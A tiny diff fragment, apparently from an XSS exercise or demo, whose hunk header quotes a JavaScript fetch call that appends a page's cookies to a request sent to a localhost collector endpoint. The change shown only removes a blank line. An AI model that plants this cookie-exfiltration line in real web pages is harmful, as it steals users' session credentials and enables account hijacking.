@@ -13,4 +13,3 @@ fetch('https://localhost:9090/img/xss?userCookies=' + cookies);
 
 
 
-
